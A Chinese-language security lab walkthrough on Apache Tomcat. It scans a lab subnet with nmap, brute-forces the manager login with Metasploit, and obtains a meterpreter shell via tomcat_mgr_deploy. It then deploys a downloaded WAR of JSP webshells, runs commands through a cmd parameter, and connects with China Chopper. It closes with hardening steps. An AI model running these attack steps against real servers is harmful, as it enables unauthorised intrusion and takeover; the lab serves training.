**实验任务一**

**探测tomcat端口，暴力破解tomcat帐号密码**

进入实验机客户端，打开metasploit，依次点击“开始”\>>“所有程序”\>>“Metasploit”\>>“MetasploitConsole”

![](../Images/5ca64ca35a9691a7359d38761d67bed8.png)  

打开metasploit界面，等待出现msf提示符后，输入命令并回车，对网段开放了8080端口的主机进行扫描（请注意参考实验机实际IP！）

nmap -sV192.168.218.0/24 -p 8080  如下所示：

![](../Images/0dc16954d3648749d1aee1380722afd6.png)  

可以看到我们探测出来一个开放了8080端口tomcat服务的主机ip:192.168.218.146（tomcat默认安装后的端口为8080），我们来通过浏览器访问一下tomcat

http://192.168.218.146:8080

![](../Images/01bd7fb134a5ec455e81f5376fbdcebd.png)  

点击左边Administration栏下的Tomcat Manager来到Tomcat默认安装后的后台管理地址为:http://192.168.218.146:8080/manager/html

![](../Images/e7ccf9e31b191a761fb1237f0313bd15.png)  

弹出对话框，要求输入用户名和密码，可以尝试下Tomcat默认安装后的用户名admin,密码为空。发现失败，那么接下来使用msf进行暴力破解

首先搜索一下msf关于tomcat的可用模块

search  tomcat

![](../Images/0351826d8c556bd25fc275a2329db863.png)  

我们使用auxiliary/scanner/http/tomcat\_mgr\_login这个模块

use auxiliary/scanner/http/tomcat\_mgr\_login

可以查看下配置 showoptions

![](../Images/a320b8917f9ee3c7f8416460e33149b0.png)  
可以发现许多参数都已经默认的设置好了，这里就用模块自带的字典吧，只需设置目标IP即可

![](../Images/7a982e1671e71ce249fc5d99f588d62d.png)  

set rhosts 192.168.218.146，然后输入run命令回车开始破解

![](../Images/9686ebb0cea429ee6618cf5559ca048a.png)  

可以看到已经成功破解出正确的用户名密码为tomcat tomcat

  

**实验任务二**

**通过tomcat后台获取Webshell**

当成功破解出tomcat的帐号密码后，我们可以继续使用metasploit获取获取其webshell。

我们使用exploit/multi/http/tomcat\_mgr\_deploy模块进行getshell的操作

use exploit/multi/http/tomcat\_mgr\_deploy

show options

![](../Images/337379f553a63c44282ecd8b24bbc975.png)  

需要设置的参数有用户名、密码、ip、端口

set username tomcat

set password tomcat

set rhost 192.168.218.146 (注意区分这里为rhost而不是之前破解tomcat的rhosts)

set rport 8080

![](../Images/ce95d66f7ec69494a22df209c3708ee8.png)  

设置完毕后，输入run命令进行攻击，成功返回meterpreter（注意如果没出现meterpreter请重复多运行几次run）

![](../Images/8f6a62eba54f49e635283beac77fbf6c.png)  

我们可以在meterpreter的基础上进一步获得服务器的cmdshell，如下图所示输入shell回车即可，更多meterpreter的命令可参考合天实验室的metasploit系列教程和https://www.91ri.org/8476.html

![](../Images/5578dc5961b308f50eccda705b7e98dc.png)  

 

使用msf自动获取tomcat的shell固然很方便，但是我们也应该掌握在后台手动部署war木马包获取shell的方法，以便于我们在某些时候下能使用到。

打开http://192.168.218.146:8080/manager/html，输入帐号密码后进入后台往下翻，来到war file to deploy

![](../Images/6f369220b15341789eeeb944655b0f78.png)  

在这可以上传个war木马包来getshell，将实验室提供的war木马包下载下来（下载地址tools.heetian.com/tools/xixi.war），我们现在就选择该xixi.war木马文件，然后点击Deploy进行上传部署。

![](../Images/db67ad0a89789646e16cba2173401f12.png)  

成功后，我们便可以在Applications栏中看到刚刚上传的xixi。

在这里，要说明下这个war木马包，把它后缀名改成rar的格式，然后打开，可以看到里面有2个jsp的木马脚本，大家也可以将自己爱用的jsp木马脚本拖进来压缩之后改后缀为war。

![](../Images/c348f77c22a309a63937aba726f465a2.png)  

现在我们就可以访问一下木马页面了。先来看下1.jsp木马的脚本内容。

其大致意思就是通过参数cmd传入系统命令并将执行回显到当前页面。

![](../Images/ed779f198dfa56fee14b5d1803f02ee2.png)  

所以访问的时候我们需要加上cmd的参数，像如下这样:

http://192.168.218.146:8080/xixi/1.jsp?cmd=whoami

![](../Images/4b554be5afe0787df5233c05dd42dd34.png)  

而2.jsp为jsp的一句话木马，打开C:\\tools\\webshell下的中国菜刀，填入木马地址，密码为xixi，脚本类型选择为Customize，点击添加，即可得到tomcat的webshell。

![](../Images/80762d281a1082ebed5c4153da3a8537.png)  

![](../Images/99a27802d7a43bd8ce63d6f4adde2d34.png)  

此外Tomcat服务默认是以system或administrator权限运行的，因此jsp木马就继承了其权限，几乎可以对Web服务器进行所有的操作。比如添加管理员用户，开启3389，连接3389登录服务器。

    

**实验任务三**

**Tomcat安全配置**   

1、设置一个复杂的tomcat的用户密码

进入服务器实验机来到C:\\Program Files\\Apache SoftwareFoundation\\Tomcat 6.0\\conf

用记事本方式打开tomcat-users.xml，修改一个复杂的密码并保存。

![](../Images/9fb7ec11a1856fc490ac89a0c38ea9a5.png)  

 2、更改tomcat端口

同样在C:\\Program Files\\Apache SoftwareFoundation\\Tomcat 6.0\\conf

目录下记事本方式打开server.xml，更改其端口为666，保存，然后重启tomcat服务。（关掉当前正在运行的tomcat窗口，重新打开C:\\Program Files\\Apache SoftwareFoundation\\Tomcat 6.0\\bin\\目录下的tomcat6.exe）

![](../Images/0dd6ba45d5eec2daa6850b0ade5f7689.png)  

浏览器访问http://192.168.218.146:666/再用修改后的密码进行登录

![](../Images/87e04527ec9fb258f8747cf72b80a235.png)  

 

3、或者直接删除webapps目录吧
